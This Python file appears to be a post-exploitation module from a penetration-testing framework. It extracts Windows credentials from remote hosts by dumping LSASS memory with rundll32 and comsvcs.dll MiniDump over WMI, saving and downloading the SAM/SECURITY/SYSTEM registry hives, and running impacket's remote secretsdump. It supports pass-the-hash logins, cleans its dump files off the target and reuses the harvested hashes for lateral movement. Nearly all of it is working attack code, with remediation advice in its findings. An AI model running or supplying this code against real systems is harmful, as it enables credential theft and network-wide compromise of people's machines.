"""Remote LSASS credential extraction — MiniDump, SAM/SECURITY hives, LSA secrets.

Extracts credentials from LSASS memory and registry hives on compromised
Windows hosts.  Uses three complementary approaches:

1. **LSASS MiniDump via comsvcs.dll** — creates a process dump of LSASS
   via ``rundll32.exe`` executed remotely, downloads the dump, and parses
   it for credential material.

2. **SAM / SECURITY / SYSTEM hive extraction** — saves registry hives via
   ``reg save``, downloads them, and extracts local account NTLM hashes.

3. **Remote secretsdump** — uses impacket's ``RemoteOperations`` to extract
   SAM hashes, LSA secrets, and cached domain credentials directly over
   the remote registry service.

All approaches require admin-level credentials on the target host.
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import os
import tempfile
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Lazy imports for optional libraries ──────────────────────────────

_impacket_available: bool | None = None
_secretsdump_available: bool | None = None


def _ensure_impacket() -> bool:
    global _impacket_available  # noqa: PLW0603
    if _impacket_available is not None:
        return _impacket_available
    try:
        import impacket.smbconnection  # type: ignore[import-untyped]  # noqa: F401
        _impacket_available = True
    except ImportError:
        log.debug("impacket not installed — LSASS dump module unavailable")
        _impacket_available = False
    return _impacket_available


def _ensure_secretsdump() -> bool:
    global _secretsdump_available  # noqa: PLW0603
    if _secretsdump_available is not None:
        return _secretsdump_available
    try:
        from impacket.examples.secretsdump import (  # type: ignore[import-untyped]
            LSASecrets,  # noqa: F401
            RemoteOperations,  # noqa: F401
            SAMHashes,  # noqa: F401
        )
        _secretsdump_available = True
    except ImportError:
        log.debug("impacket secretsdump not available — registry extraction only")
        _secretsdump_available = False
    return _secretsdump_available


# ── SMB connection helpers (synchronous) ─────────────────────────────


def _connect_smb(
    ip: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str | None = None,
) -> Any | None:
    """Establish an authenticated SMB connection to the target."""
    try:
        from impacket.smbconnection import SMBConnection  # type: ignore[import-untyped]

        conn = SMBConnection(ip, ip, sess_port=445)
        conn.negotiateSession()

        if ntlm_hash:
            lm, nt = "", ntlm_hash
            if ":" in ntlm_hash:
                lm, nt = ntlm_hash.split(":", 1)
            conn.login(username, "", domain, lmhash=lm, nthash=nt)
        else:
            conn.login(username, password, domain)

        return conn
    except Exception as e:
        log.debug("LSASS dump: SMB connection to %s failed: %s", ip, e)
        return None


def _disconnect_smb(conn: Any) -> None:
    """Close an SMB connection."""
    with contextlib.suppress(Exception):
        conn.close()


def _read_remote_file(conn: Any, share: str, path: str) -> bytes | None:
    """Read a file from a remote SMB share. Returns bytes or None."""
    try:
        from io import BytesIO
        buf = BytesIO()
        conn.getFile(share, path, buf.write)
        return buf.getvalue()
    except Exception:
        return None


def _delete_remote_file(conn: Any, share: str, path: str) -> bool:
    """Delete a file on the remote SMB share. Returns True on success."""
    try:
        conn.deleteFile(share, path)
        return True
    except Exception as e:
        log.debug("LSASS dump: failed to delete remote file %s: %s", path, e)
        return False


def _exec_remote_cmd(
    ip: str,
    username: str,
    password: str,
    domain: str,
    ntlm_hash: str | None,
    command: str,
) -> bool:
    """Execute a command on the remote host via WMI.

    Returns True if execution was dispatched successfully.
    """
    try:
        from impacket.dcerpc.v5.dcom.wmi import (  # type: ignore[import-untyped]
            CLSID_WbemLevel1Login,
            IID_IWbemLevel1Login,
            IWbemLevel1Login,
        )
        from impacket.dcerpc.v5.dcomrt import DCOMConnection  # type: ignore[import-untyped]

        dcom = DCOMConnection(
            ip, username=username, password=password,
            domain=domain, lmhash="", nthash=ntlm_hash or "",
        )

        iInterface = dcom.CoCreateInstanceEx(
            CLSID_WbemLevel1Login, IID_IWbemLevel1Login,
        )
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", None, None)
        iWbemLevel1Login.RemRelease()

        win32_process, _ = iWbemServices.GetObject("Win32_Process")
        win32_process.Create(command, "C:\\", None)

        dcom.disconnect()
        return True
    except Exception as e:
        log.debug("LSASS dump: WMI command execution on %s failed: %s", ip, e)
        return False


# ── Method 1: LSASS MiniDump via comsvcs.dll ─────────────────────────


def _find_lsass_pid(
    ip: str,
    username: str,
    password: str,
    domain: str,
    ntlm_hash: str | None,
) -> int | None:
    """Query the remote host for the LSASS process ID via WMI."""
    try:
        from impacket.dcerpc.v5.dcom.wmi import (  # type: ignore[import-untyped]
            CLSID_WbemLevel1Login,
            IID_IWbemLevel1Login,
            IWbemLevel1Login,
        )
        from impacket.dcerpc.v5.dcomrt import DCOMConnection  # type: ignore[import-untyped]

        dcom = DCOMConnection(
            ip, username=username, password=password,
            domain=domain, lmhash="", nthash=ntlm_hash or "",
        )

        iInterface = dcom.CoCreateInstanceEx(
            CLSID_WbemLevel1Login, IID_IWbemLevel1Login,
        )
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", None, None)
        iWbemLevel1Login.RemRelease()

        enum = iWbemServices.ExecQuery(
            "SELECT ProcessId FROM Win32_Process WHERE Name = 'lsass.exe'"
        )

        pid: int | None = None
        while True:
            try:
                obj = enum.Next(0xFFFFFFFF, 1)[0]
                pid = int(obj.ProcessId)
                break
            except Exception:
                break

        dcom.disconnect()
        return pid
    except Exception as e:
        log.debug("LSASS dump: WMI PID lookup on %s failed: %s", ip, e)
        return None


def _dump_lsass_minidump(
    ip: str,
    username: str,
    password: str,
    domain: str,
    ntlm_hash: str | None,
    conn: Any,
) -> bytes | None:
    """Create an LSASS MiniDump via comsvcs.dll and download it.

    Executes: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> <path> full
    Then downloads the dump file via SMB and deletes it from the target.

    Returns the raw dump bytes or None on failure.
    """
    pid = _find_lsass_pid(ip, username, password, domain, ntlm_hash)
    if pid is None:
        log.debug("LSASS dump: could not find lsass.exe PID on %s", ip)
        return None

    dump_path_remote = "Windows\\Temp\\debug.dmp"
    dump_path_full = f"C:\\{dump_path_remote}"

    # Execute the dump command via WMI
    cmd = (
        f"C:\\Windows\\System32\\rundll32.exe "
        f"C:\\Windows\\System32\\comsvcs.dll, MiniDump "
        f"{pid} {dump_path_full} full"
    )
    success = _exec_remote_cmd(
        ip, username, password, domain, ntlm_hash, cmd,
    )
    if not success:
        return None

    # Wait for the dump to be written — the WMI call returns immediately
    import time
    dump_data: bytes | None = None
    for _attempt in range(12):
        time.sleep(5)
        dump_data = _read_remote_file(conn, "C$", dump_path_remote)
        if dump_data and len(dump_data) > 1024:
            break

    # Clean up the dump file from the target
    _delete_remote_file(conn, "C$", dump_path_remote)

    if dump_data and len(dump_data) > 1024:
        return dump_data

    log.debug("LSASS dump: minidump download from %s failed or empty", ip)
    return None


# ── Method 2: Registry hive extraction ───────────────────────────────


def _extract_registry_hives(
    ip: str,
    username: str,
    password: str,
    domain: str,
    ntlm_hash: str | None,
    conn: Any,
) -> dict[str, bytes]:
    """Save and download SAM, SECURITY, and SYSTEM registry hives.

    Uses ``reg save`` via WMI, downloads the files over SMB, then
    cleans up the remote copies.

    Returns a dict with keys 'sam', 'security', 'system' -> raw bytes.
    """
    hives: dict[str, bytes] = {}
    hive_map = {
        "sam": ("HKLM\\SAM", "Windows\\Temp\\s.tmp"),
        "security": ("HKLM\\SECURITY", "Windows\\Temp\\se.tmp"),
        "system": ("HKLM\\SYSTEM", "Windows\\Temp\\sy.tmp"),
    }

    # Save each hive on the remote host
    for _hive_name, (reg_path, remote_path) in hive_map.items():
        cmd = f"cmd.exe /c reg save {reg_path} C:\\{remote_path} /y"
        _exec_remote_cmd(ip, username, password, domain, ntlm_hash, cmd)

    # Wait for the saves to complete
    import time
    time.sleep(5)

    # Download each hive
    for hive_name, (_, remote_path) in hive_map.items():
        data = _read_remote_file(conn, "C$", remote_path)
        if data and len(data) > 0:
            hives[hive_name] = data
        # Clean up regardless of download success
        _delete_remote_file(conn, "C$", remote_path)

    return hives


def _parse_hive_credentials(
    hive_data: dict[str, bytes],
) -> dict[str, list[dict[str, str]]]:
    """Parse downloaded registry hives to extract credentials.

    Uses impacket's SAMHashes and LSASecrets classes with local file
    parsing (no remote connection needed).

    Returns a dict with keys 'sam' and 'lsa', each a list of credential dicts.
    """
    results: dict[str, list[dict[str, str]]] = {"sam": [], "lsa": []}

    if "system" not in hive_data:
        return results

    # Write hives to temp files for impacket parsing
    tmp_files: dict[str, str] = {}
    try:
        for hive_name, data in hive_data.items():
            tmp = tempfile.NamedTemporaryFile(
                suffix=f".{hive_name}", delete=False,
            )
            tmp.write(data)
            tmp.close()
            tmp_files[hive_name] = tmp.name

        if "system" not in tmp_files:
            return results

        try:
            from impacket.examples.secretsdump import (  # type: ignore[import-untyped]
                LocalOperations,
                LSASecrets,
                SAMHashes,
            )

            local_ops = LocalOperations(tmp_files["system"])
            boot_key = local_ops.getBootKey()

            # Extract SAM hashes
            if "sam" in tmp_files:

                class _SAMCallback:
                    def __init__(self) -> None:
                        self.entries: list[dict[str, str]] = []

                    def __call__(self, secret: str) -> None:
                        parts = secret.split(":")
                        if len(parts) >= 4:
                            self.entries.append({
                                "username": parts[0],
                                "rid": parts[1],
                                "lm_hash": parts[2],
                                "nt_hash": parts[3],
                            })

                sam_cb = _SAMCallback()
                try:
                    sam = SAMHashes(
                        tmp_files["sam"], boot_key,
                        isRemote=False, perSecretCallback=sam_cb,
                    )
                    sam.dump()
                    results["sam"] = sam_cb.entries
                    sam.finish()
                except Exception as e:
                    log.debug("LSASS dump: SAM hash extraction failed: %s", e)

            # Extract LSA secrets and cached credentials
            if "security" in tmp_files:

                class _LSACallback:
                    def __init__(self) -> None:
                        self.entries: list[dict[str, str]] = []

                    def __call__(self, secret_type: str, secret: str) -> None:
                        self.entries.append({
                            "type": secret_type,
                            "value": secret,
                        })

                lsa_cb = _LSACallback()
                try:
                    lsa = LSASecrets(
                        tmp_files["security"], boot_key, None,
                        isRemote=False, perSecretCallback=lsa_cb,
                    )
                    lsa.dumpCachedHashes()
                    lsa.dumpSecrets()
                    results["lsa"] = lsa_cb.entries
                    lsa.finish()
                except Exception as e:
                    log.debug("LSASS dump: LSA secret extraction failed: %s", e)

        except ImportError:
            log.debug("impacket secretsdump not available for local parsing")

    finally:
        # Remove temp files
        for path in tmp_files.values():
            with contextlib.suppress(OSError):
                os.unlink(path)

    return results


# ── Method 3: Remote secretsdump via RemoteOperations ────────────────


def _remote_secretsdump(
    ip: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str | None = None,
) -> dict[str, list[dict[str, str]]]:
    """Use impacket's RemoteOperations to extract credentials directly.

    This is the most reliable extraction method. It enables the
    RemoteRegistry service if needed, retrieves the boot key, and
    dumps SAM hashes and LSA secrets over the network.

    Returns a dict with keys 'sam', 'lsa' — each a list of credential dicts.
    """
    results: dict[str, list[dict[str, str]]] = {"sam": [], "lsa": []}

    try:
        from impacket.examples.secretsdump import (  # type: ignore[import-untyped]
            LSASecrets,
            RemoteOperations,
            SAMHashes,
        )
        from impacket.smbconnection import SMBConnection  # type: ignore[import-untyped]

        conn = SMBConnection(ip, ip, sess_port=445)
        conn.negotiateSession()
        if ntlm_hash:
            lm, nt = "", ntlm_hash
            if ":" in ntlm_hash:
                lm, nt = ntlm_hash.split(":", 1)
            conn.login(username, "", domain, lmhash=lm, nthash=nt)
        else:
            conn.login(username, password, domain)

        remote_ops = RemoteOperations(conn, False)
        remote_ops.enableRegistry()
        boot_key = remote_ops.getBootKey()

        # ── SAM hashes ──────────────────────────────────────────────

        class _SAMCallback:
            def __init__(self) -> None:
                self.entries: list[dict[str, str]] = []

            def __call__(self, secret: str) -> None:
                parts = secret.split(":")
                if len(parts) >= 4:
                    self.entries.append({
                        "username": parts[0],
                        "rid": parts[1],
                        "lm_hash": parts[2],
                        "nt_hash": parts[3],
                    })

        sam_cb = _SAMCallback()
        try:
            sam_hashes = SAMHashes(
                remote_ops.saveSAM(), boot_key,
                isRemote=True, perSecretCallback=sam_cb,
            )
            sam_hashes.dump()
            results["sam"] = sam_cb.entries
            sam_hashes.finish()
        except Exception as e:
            log.debug("LSASS dump: remote SAM extraction failed: %s", e)

        # ── LSA secrets and cached credentials ───────────────────────

        class _LSACallback:
            def __init__(self) -> None:
                self.entries: list[dict[str, str]] = []

            def __call__(self, secret_type: str, secret: str) -> None:
                self.entries.append({"type": secret_type, "value": secret})

        lsa_cb = _LSACallback()
        try:
            lsa = LSASecrets(
                remote_ops.saveSECURITY(), boot_key, remote_ops,
                isRemote=True, perSecretCallback=lsa_cb,
            )
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()
            results["lsa"] = lsa_cb.entries
            lsa.finish()
        except Exception as e:
            log.debug("LSASS dump: remote LSA extraction failed: %s", e)

        remote_ops.finish()
        conn.close()

    except ImportError:
        log.debug("impacket secretsdump not available")
    except Exception as e:
        log.debug("LSASS dump: remote secretsdump on %s failed: %s", ip, e)

    return results


# ── Credential field extraction helper ───────────────────────────────


def _extract_cred_fields(cred: Any) -> tuple[str, str, str, str | None]:
    """Extract (username, password, domain, ntlm_hash) from a credential."""
    if hasattr(cred, "username"):
        username = cred.username
        password = cred.value
        domain = cred.domain or ""
        ntlm_hash = None
        if hasattr(cred, "cred_type") and str(cred.cred_type) == "ntlm_hash":
            ntlm_hash = password
            password = ""
    else:
        username = str(cred.get("username", ""))
        password = str(cred.get("value", ""))
        domain = str(cred.get("domain", ""))
        ntlm_hash = None
        if cred.get("cred_type") == "ntlm_hash":
            ntlm_hash = password
            password = ""
    return username, password, domain, ntlm_hash


# ── Module ───────────────────────────────────────────────────────────


class LsassDumpModule(BaseModule):
    """Remote LSASS credential extraction via MiniDump, registry hives, and secretsdump."""

    name = "post.lsass_dump"
    description = "Extract credentials from LSASS memory and registry hives on Windows hosts"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1003.001", "T1003.002", "T1003.004"]
    required_facts = ["credential.admin", "host"]
    produced_facts = ["credential.admin"]
    safety = ExploitSafety.DANGEROUS

    async def check(self, ctx: ModuleContext) -> bool:
        """Verify impacket is available and admin credentials exist."""
        if not _ensure_impacket():
            return False
        return await super().check(ctx)

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        if not _ensure_impacket():
            return findings

        has_secretsdump = _ensure_secretsdump()

        admin_creds = await ctx.facts.get_all("credential.admin")
        seen_hosts: set[str] = set()

        for fact in admin_creds:
            host_id = fact.host_id
            if host_id is None or host_id in seen_hosts:
                continue
            seen_hosts.add(host_id)

            ip = await self.resolve_ip(ctx, host_id)
            if ip is None:
                continue

            # Only target Windows hosts (SMB on port 445)
            has_smb = bool(await ctx.facts.get_for_host("service.smb", host_id))
            if not has_smb:
                continue

            cred = fact.value
            username, password, domain, ntlm_hash = _extract_cred_fields(cred)
            if not username:
                continue

            await ctx.rate_limiter.acquire()

            await self._extract_from_host(
                ctx, findings, host_id, ip,
                username, password, domain, ntlm_hash,
                has_secretsdump,
            )

        return findings

    async def _extract_from_host(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        host_id: str,
        ip: str,
        username: str,
        password: str,
        domain: str,
        ntlm_hash: str | None,
        has_secretsdump: bool,
    ) -> None:
        """Run all extraction methods against a single host."""

        total_creds = 0
        methods_used: list[str] = []

        # ── Method 1: Remote secretsdump (most reliable) ─────────────
        if has_secretsdump:
            await ctx.rate_limiter.acquire()
            secretsdump_results = await asyncio.to_thread(
                _remote_secretsdump, ip, username, password, domain, ntlm_hash,
            )

            sam_count = len(secretsdump_results["sam"])
            lsa_count = len(secretsdump_results["lsa"])

            if sam_count > 0:
                methods_used.append("secretsdump/SAM")
                total_creds += sam_count
                await self._store_sam_credentials(
                    ctx, findings, host_id, ip, domain,
                    secretsdump_results["sam"], "remote_secretsdump",
                )

            if lsa_count > 0:
                methods_used.append("secretsdump/LSA")
                total_creds += lsa_count
                await self._store_lsa_credentials(
                    ctx, findings, host_id, ip,
                    secretsdump_results["lsa"], "remote_secretsdump",
                )

        # ── Method 2: LSASS MiniDump via comsvcs.dll ─────────────────
        # Only attempt if secretsdump did not already yield results —
        # the minidump is noisier and takes longer.
        if total_creds == 0:
            await ctx.rate_limiter.acquire()

            conn = await asyncio.to_thread(
                _connect_smb, ip, username, password, domain, ntlm_hash,
            )
            if conn is not None:
                try:
                    dump_data = await asyncio.to_thread(
                        _dump_lsass_minidump,
                        ip, username, password, domain, ntlm_hash, conn,
                    )

                    if dump_data:
                        methods_used.append("comsvcs.dll_MiniDump")
                        findings.append(Finding(
                            title=f"LSASS process dump obtained from {ip}",
                            description=(
                                f"Successfully created and downloaded an LSASS "
                                f"memory dump from {ip} using comsvcs.dll MiniDump. "
                                f"The dump ({len(dump_data)} bytes) may contain "
                                f"plaintext passwords, NTLM hashes, and Kerberos "
                                f"tickets depending on the host configuration."
                            ),
                            severity=Severity.CRITICAL,
                            host_id=host_id,
                            module_name=self.name,
                            attack_technique_ids=["T1003.001"],
                            evidence=[
                                Evidence(
                                    kind="lsass_minidump",
                                    data=(
                                        f"Method: comsvcs.dll MiniDump via WMI\n"
                                        f"Target: {ip}\n"
                                        f"Dump size: {len(dump_data)} bytes\n"
                                        f"Dump file cleaned from target: yes"
                                    ),
                                ),
                            ],
                            remediation=(
                                "Enable Credential Guard to protect LSASS memory. "
                                "Configure LSA Protection (RunAsPPL) to prevent "
                                "unauthorized process access. Deploy EDR with "
                                "LSASS dump detection rules."
                            ),
                            verified=True,
                        ))
                        total_creds += 1

                    # ── Method 3: Registry hive extraction ───────────
                    # Attempt hive extraction as a fallback or supplement
                    await ctx.rate_limiter.acquire()

                    hive_data = await asyncio.to_thread(
                        _extract_registry_hives,
                        ip, username, password, domain, ntlm_hash, conn,
                    )

                    if hive_data:
                        hive_results = await asyncio.to_thread(
                            _parse_hive_credentials, hive_data,
                        )

                        hive_sam = len(hive_results["sam"])
                        hive_lsa = len(hive_results["lsa"])

                        if hive_sam > 0:
                            methods_used.append("registry_hive/SAM")
                            total_creds += hive_sam
                            await self._store_sam_credentials(
                                ctx, findings, host_id, ip, domain,
                                hive_results["sam"], "registry_hive",
                            )

                        if hive_lsa > 0:
                            methods_used.append("registry_hive/LSA")
                            total_creds += hive_lsa
                            await self._store_lsa_credentials(
                                ctx, findings, host_id, ip,
                                hive_results["lsa"], "registry_hive",
                            )

                finally:
                    await asyncio.to_thread(_disconnect_smb, conn)

        # ── Summary finding ──────────────────────────────────────────
        if total_creds > 0:
            findings.append(Finding(
                title=f"Credential extraction summary for {ip}",
                description=(
                    f"Extracted a total of {total_creds} credential(s) from "
                    f"{ip} using {len(methods_used)} method(s): "
                    f"{', '.join(methods_used)}. These credentials may enable "
                    f"lateral movement to additional hosts in the environment."
                ),
                severity=Severity.CRITICAL,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=self.attack_technique_ids,
                evidence=[
                    Evidence(
                        kind="extraction_summary",
                        data=(
                            f"Target: {ip}\n"
                            f"Methods used: {', '.join(methods_used)}\n"
                            f"Total credentials extracted: {total_creds}"
                        ),
                    ),
                ],
                remediation=(
                    "Enable Credential Guard on all Windows 10+ and Server 2016+ "
                    "systems to protect LSASS memory. Disable WDigest authentication "
                    "(set UseLogonCredential to 0 under HKLM\\SYSTEM\\CurrentControlSet"
                    "\\Control\\SecurityProviders\\WDigest). Deploy Microsoft LAPS to "
                    "randomize local administrator passwords across all workstations "
                    "and servers. Configure LSA Protection (RunAsPPL) to prevent "
                    "unauthorized access to the LSASS process. Monitor for "
                    "suspicious registry access patterns and LSASS memory reads."
                ),
                verified=True,
            ))

    async def _store_sam_credentials(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        host_id: str,
        ip: str,
        domain: str,
        sam_entries: list[dict[str, str]],
        method: str,
    ) -> None:
        """Create findings and persist SAM hash credentials."""
        findings.append(Finding(
            title=f"SAM hashes extracted from {ip} via {method}",
            description=(
                f"Extracted {len(sam_entries)} local account NTLM hash(es) "
                f"from the SAM database on {ip}. These hashes can be cracked "
                f"offline or used directly in pass-the-hash attacks to "
                f"authenticate to other systems with the same local passwords."
            ),
            severity=Severity.CRITICAL,
            host_id=host_id,
            module_name=self.name,
            attack_technique_ids=["T1003.002"],
            evidence=[
                Evidence(
                    kind="sam_extraction",
                    data=(
                        f"Method: {method}\n"
                        f"Target: {ip}\n"
                        f"Accounts extracted: {len(sam_entries)}"
                    ),
                ),
            ],
            remediation=(
                "Deploy Microsoft LAPS to randomize and rotate local "
                "administrator passwords. Disable LM hash storage via "
                "Group Policy. Enforce strong password policies for all "
                "local accounts."
            ),
            verified=True,
        ))

        for entry in sam_entries:
            new_cred = Credential(
                host_id=host_id,
                username=entry["username"],
                cred_type=CredentialType.NTLM_HASH,
                value=f"{entry['lm_hash']}:{entry['nt_hash']}",
                domain=domain or None,
                source_module=self.name,
                valid=True,
                admin="admin" in entry.get("username", "").lower(),
            )
            fact_type = (
                "credential.admin" if new_cred.admin
                else "credential.admin"
            )
            await ctx.facts.add(
                fact_type, new_cred, self.name, host_id=host_id,
            )
            if ctx.db is not None:
                await ctx.db.insert_credential(new_cred)

    async def _store_lsa_credentials(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        host_id: str,
        ip: str,
        lsa_entries: list[dict[str, str]],
        method: str,
    ) -> None:
        """Create findings and persist LSA secret credentials."""

        # Classify LSA entries
        cached_creds = [
            e for e in lsa_entries if "cachedlogon" in e.get("type", "").lower()
        ]
        service_creds = [
            e for e in lsa_entries if "service" in e.get("type", "").lower()
            or "defaultpassword" in e.get("type", "").lower()
        ]
        other_secrets = [
            e for e in lsa_entries
            if e not in cached_creds and e not in service_creds
        ]

        if cached_creds:
            findings.append(Finding(
                title=f"Cached domain credentials extracted from {ip}",
                description=(
                    f"Extracted {len(cached_creds)} cached domain logon "
                    f"credential(s) from {ip} via {method}. Cached credentials "
                    f"are DCC2 hashes that can be cracked offline to recover "
                    f"domain user passwords."
                ),
                severity=Severity.CRITICAL,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=["T1003.004"],
                evidence=[
                    Evidence(
                        kind="cached_credentials",
                        data=(
                            f"Method: {method}\n"
                            f"Target: {ip}\n"
                            f"Cached credentials found: {len(cached_creds)}"
                        ),
                    ),
                ],
                remediation=(
                    "Reduce the number of cached logons via Group Policy "
                    "(CachedLogonsCount). Enforce strong domain passwords "
                    "to resist offline cracking of DCC2 hashes."
                ),
                verified=True,
            ))

        if service_creds:
            findings.append(Finding(
                title=f"Service account credentials extracted from {ip}",
                description=(
                    f"Extracted {len(service_creds)} service account or "
                    f"auto-logon credential(s) from LSA secrets on {ip}. "
                    f"These may include plaintext passwords for service "
                    f"accounts, scheduled tasks, or auto-logon configurations."
                ),
                severity=Severity.CRITICAL,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=["T1003.004"],
                evidence=[
                    Evidence(
                        kind="service_credentials",
                        data=(
                            f"Method: {method}\n"
                            f"Target: {ip}\n"
                            f"Service credentials found: {len(service_creds)}"
                        ),
                    ),
                ],
                remediation=(
                    "Use Group Managed Service Accounts (gMSA) instead of "
                    "traditional service accounts with static passwords. "
                    "Remove auto-logon configurations from workstations."
                ),
                verified=True,
            ))

        if other_secrets:
            findings.append(Finding(
                title=f"LSA secrets extracted from {ip}",
                description=(
                    f"Extracted {len(other_secrets)} additional LSA secret(s) "
                    f"from {ip} via {method}. LSA secrets may contain machine "
                    f"account passwords, VPN credentials, and other sensitive "
                    f"authentication material."
                ),
                severity=Severity.HIGH,
                host_id=host_id,
                module_name=self.name,
                attack_technique_ids=["T1003.004"],
                evidence=[
                    Evidence(
                        kind="lsa_secrets",
                        data=(
                            f"Method: {method}\n"
                            f"Target: {ip}\n"
                            f"LSA secrets found: {len(other_secrets)}"
                        ),
                    ),
                ],
                remediation=(
                    "Minimize stored credentials on endpoints. Use Credential "
                    "Guard to protect LSA secrets. Audit and remove unnecessary "
                    "stored credentials from workstations and servers."
                ),
            ))

        # Persist all LSA credentials
        for entry in lsa_entries:
            secret_value = entry.get("value", "")
            secret_type = entry.get("type", "")

            # Determine credential type based on the secret format
            if "cachedlogon" in secret_type.lower():
                cred_type = CredentialType.NTLM_HASH
            elif "kerberos" in secret_type.lower():
                cred_type = CredentialType.TICKET
            else:
                cred_type = CredentialType.PASSWORD

            # Extract username from the secret value if possible
            cred_username = "unknown"
            if "\\" in secret_value:
                parts = secret_value.split("\\", 1)
                cred_username = parts[1].split(":")[0] if ":" in parts[1] else parts[1]
            elif ":" in secret_value:
                cred_username = secret_value.split(":")[0]
            elif "/" in secret_type:
                cred_username = secret_type.split("/")[-1]

            new_cred = Credential(
                host_id=host_id,
                username=cred_username,
                cred_type=cred_type,
                value=secret_value[:256],
                domain=None,
                source_module=self.name,
                valid=True,
                admin=False,
            )
            await ctx.facts.add(
                "credential.admin", new_cred, self.name, host_id=host_id,
            )
            if ctx.db is not None:
                await ctx.db.insert_credential(new_cred)
